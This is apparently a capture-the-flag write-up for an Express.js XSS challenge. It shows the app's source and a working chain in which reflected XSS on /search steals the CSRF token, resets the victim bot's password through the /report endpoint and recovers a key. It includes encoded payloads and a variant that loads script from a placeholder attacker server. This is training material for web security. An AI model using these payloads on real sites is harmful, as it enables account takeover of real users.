## js code

<details>
   <summary>code</summary>

```js
const express = require('express');
const session = require('express-session');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const app = express();
const puppeteer = require('puppeteer');

// --------------------------------------------------Auxiliary Code
app.use(bodyParser.urlencoded({ extended: true }));
app.use(session({
    secret: process.env.SESSION_SECRET,
    resave: false,
    saveUninitialized: true
}));

app.use((req, res, next) => {
    if (!req.session.csrfToken) {
        req.session.csrfToken = generateCSRFToken();
    }
    next();
});

const crypto = require('crypto');

function generateCSRFToken() {
    return crypto.randomBytes(32).toString('hex');
}

function verifyCSRF(req, res) {
    const tokenFromBody = req.body._csrf;
    const tokenFromSession = req.session.csrfToken;
    return tokenFromBody && tokenFromSession && tokenFromBody === tokenFromSession;
}

function escapeHTML(str) {
    return String(str).replace(/[&<>"'`=\/]/g, function (char) {
        return {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#x27;',
            '`': '&#x60;',
            '=': '&#x3D;',
            '/': '&#x2F;'
        }[char];
    });
}

// Insecure in-memory users database, only for XSS challenge purposes
const users = {
    alice: { username: 'alice', password: 'pass', bio: 'Hi, I am Alice!' },
    bob: { username: 'bob', password: process.env.BOB_PASS, bio: 'Hello from Bob!' }
};

let sharedComments = [];

function isAuthenticated(req) {
    return req.session && req.session.username && users[req.session.username];
}

function renderHTML(filePath, replacements = {}) {
    let content = fs.readFileSync(path.join(__dirname, 'public', filePath), 'utf-8');
    for (let key in replacements) {
        const regex = new RegExp(`{{${key}}}`, 'g');
        content = content.replace(regex, replacements[key]);
    }
    return content;
}

// -------------------------------------------- Routes

app.get('/', (req, res) => {
    if (isAuthenticated(req)) return res.redirect('/profile');
    res.send(renderHTML('login.html', { error: '' }));
});

// Insecure login flow, only for XSS challenge purposes
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    if (users[username] && users[username].password === password) {
        req.session.username = username;

        // Set masterkey cookie
        let masterKeyValue = '';

        if (username === 'alice') {
            masterKeyValue = 'DEMOMASTERKEY';
        } else if (username === 'bob') {
            try {
                masterKeyValue = fs.readFileSync('/tmp/masterkey.txt', 'utf8').trim();
            } catch (err) {
                console.error('[!] Failed to read /tmp/masterkey.txt:', err);
                masterKeyValue = 'ERROR';
            }
        }

        res.cookie('masterkey', masterKeyValue, {
            httpOnly: true, // Not Accessible by javascript code
        });

        return res.redirect('/profile');
    }

    res.send(renderHTML('login.html', { error: '<p class="error">Invalid credentials</p>', csrfToken: req.session.csrfToken }));
});

app.get('/profile', (req, res) => {
    if (!isAuthenticated(req)) return res.redirect('/');
    const user = users[req.session.username];
    res.send(renderHTML('profile.html', {
        username: escapeHTML(user.username),
        bio: escapeHTML(user.bio),
        csrfToken: req.session.csrfToken}));
});

app.post('/profile', (req, res) => {
    if (!isAuthenticated(req)) return res.redirect('/');
    if (!verifyCSRF(req, res)) return res.status(403).send('Invalid CSRF token');
    const { bio, password } = req.body;
    const user = users[req.session.username];
    user.bio = bio;
    if (password && password.trim()) user.password = password;
    res.redirect('/profile');
});

app.get('/shared', (req, res) => {
    if (!isAuthenticated(req)) return res.redirect('/');
    const commentHTML = sharedComments.map(c =>
        `<li><strong>${escapeHTML(c.author)}:</strong> ${escapeHTML(c.text)}</li>`
    ).join('');
    res.send(renderHTML('shared.html', { comments: commentHTML, csrfToken: req.session.csrfToken }));
});

app.post('/shared', (req, res) => {
    if (!isAuthenticated(req)) return res.redirect('/');
    if (!verifyCSRF(req, res)) return res.status(403).send('Invalid CSRF token');
    const comment = {
        author: req.session.username,
        text: req.body.comment
    };
    sharedComments.push(comment);
    res.redirect('/shared');
});

app.get('/search', (req, res) => {
    if (!isAuthenticated(req)) return res.status(401).send('Unauthorized');

    const query = req.query.query || '';
    if (!query) return res.status(400).send('Query parameter is required');

    const results = sharedComments.filter(c => 
        c.text.includes(query)
    );

    let html = `<h2>Search Results for "${query}"</h2>`;
    if (results.length === 0) {
        html += `<p>No matches found.</p>`;
    } else {
        html += '<ul>';
        results.forEach(c => {
            html += `<li><strong>${escapeHTML(c.author)}:</strong> ${escapeHTML(c.text)}</li>`;
        });
        html += '</ul>';
    }

    html += `<br><a href="/shared">Back to Shared Area</a>`;
    res.send(html);
});

app.get('/logout', (req, res) => {
    req.session.destroy(() => {
        res.redirect('/');
    });
});

app.get('/report', async (req, res) => {
    const targetUrl = req.query.url;

    if (!targetUrl || !targetUrl.startsWith('http://localhost/')) {
        return res.status(400).send('Invalid or missing URL (must start with http://localhost)');
    }

    res.send('Bob is checking it out...');

/**
 * 
 * 
 * 
 * 
 * 
 * BOB AUTOMATED LOGIN CODE 
 * 
 * 
 **/

});

app.listen(80, () => {
    console.log('Running on http://localhost:80');
});

```

  
</details>

---

```javascript
// Insecure in-memory users database, only for XSS challenge purposes
const users = {
    alice: { username: 'alice', password: 'pass', bio: 'Hi, I am Alice!' },
    bob: { username: 'bob', password: process.env.BOB_PASS, bio: 'Hello from Bob!' }
};
```

```ruby
alice : pass
```

----

```javascript
let html = `<h2>Search Results for "${query}"</h2>`;
```

#### **`http://18.201.68.91/search?query=%3Cscript%3Ealert(4)%3C/script%3E`**

<img width="1099" height="294" alt="image" src="https://github.com/user-attachments/assets/1aaf0317-6499-4c51-a30f-518c6bd1a69d" />

---

## httponly is True

```javascript
 res.cookie('masterkey', masterKeyValue, {
            httpOnly: true, // Not Accessible by javascript code
        });
```

## if we try to get cookie using js

```url
http://18.201.112.94/search?query=%3Cimg+src%3Dx+onerror%3Dalert%28document.cookie%29%3E
```

<img width="1477" height="427" alt="image" src="https://github.com/user-attachments/assets/ea719d5a-20a0-44f3-a53f-1e16ca854d3e" />

## found that there is CSRF VULN

```javascript
 app.post('/profile', (req, res) => {
    if (!isAuthenticated(req)) return res.redirect('/');
    if (!verifyCSRF(req, res)) return res.status(403).send('Invalid CSRF token');
```

## try to change **`bob`** password 

<details>
  <summary>CSRF poc</summary>

```html
<script>
fetch('/profile', {
  method: 'GET',
  credentials: 'include'
})
  .then(response => response.text())
  .then(html => {
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');

    const csrfToken = doc.querySelector('input[name="_csrf"]').getAttribute('value');

    const params = new URLSearchParams();
    params.append('_csrf', csrfToken);
    params.append('bio', 'I\'ve been hacked!');
    params.append('password', 'NewPass');

    return fetch('/profile', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: params.toString(),
      credentials: 'include'
    });
  })
  .then(postResponse => {
    if (postResponse.ok) {
      console.log('POST successful');
    } else {
      console.error('POST failed');
    }
  })
  .catch(err => console.error('Error:', err));
</script>
```

We can send this to Bob using the ``/report`` endpoint.

```url
http://localhost/search?query=PAYLOAD
```

#### or

```url
http://localhost/search?query=<script src='https://<attacker-server>/payload.js'></script>
```

  
</details>

```
http://localhost/search?query=%3Cscript%3Efetch('/profile'%2C%7Bmethod%3A'GET'%2Ccredentials%3A'include'%7D).then(r%3D%3Er.text()).then(html%3D%3E%7Bconst parser%3Dnew DOMParser()%3Bconst doc%3Dparser.parseFromString(html%2C'text%2Fhtml')%3Bconst token%3Ddoc.querySelector('input%5Bname%3D%22_csrf%22%5D').value%3Bconst params%3Dnew URLSearchParams()%3Bparams.append('_csrf'%2Ctoken)%3Bparams.append('bio'%2C'Hacked!')%3Bparams.append('password'%2C'NewPass123')%3Bfetch('/profile'%2C%7Bmethod%3A'POST'%2Cheaders%3A%7B'Content-Type'%3A'application%2Fx-www-form-urlencoded'%7D%2Cbody%3Aparams.toString()%2Ccredentials%3A'include'%7D)%3B%7D)%3C%2Fscript%3E

```

```
bob : NewPass123
```

<img width="1883" height="770" alt="image" src="https://github.com/user-attachments/assets/5a07512d-94c4-410f-905b-d6a00ee74ee0" />

```
0a3433fb2e41367af97b5712b3d01e37
```

## Conclusion:

- The CSRF was theoretically secured.

- But XSS breaks the protection because you can run the code from within the browser and get the token that is supposed to be secret.

- Since cookies are ``HttpOnly``, you cannot steal them directly.
- Instead, I stole the token and conducted a successful CSRF attack.

### 🔹 In short:

> XSS + CSRF = Full Account Takeover.
> 
> XSS allows you to bypass CSRF restrictions and act as if you were the victim yourself.

